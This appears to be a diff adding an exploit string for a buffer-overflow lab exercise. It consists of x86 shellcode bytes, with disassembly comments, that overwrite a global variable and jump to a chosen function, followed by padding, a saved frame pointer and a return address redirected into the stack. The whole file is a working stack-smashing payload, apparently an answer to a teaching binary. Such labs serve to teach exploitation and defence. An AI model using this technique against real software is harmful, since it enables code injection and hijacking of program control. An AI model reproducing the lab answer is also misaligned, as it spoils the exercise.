@@ -1,0 +1,11 @@
+b8 4e d7 5b 5f       	/* 0 mov    $0x5f5bd74e,%eax */
+a3 ec c1 04 08       	/* 5 mov    %eax,0x804c1ec */
+68 eb 8c 04 08       	/* a push   $0x8048ceb	*/
+c3                   	/* f ret	*/
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 			/* pad 16byte zeros */ 
+a0 3a 68 55 			/* ebp @ 0x55683aa0 , does not matters here */  
+80 3a 68 55 			/* return address @ebp+4, make it to ebp-0x20 = 0x55683a80 */  
+
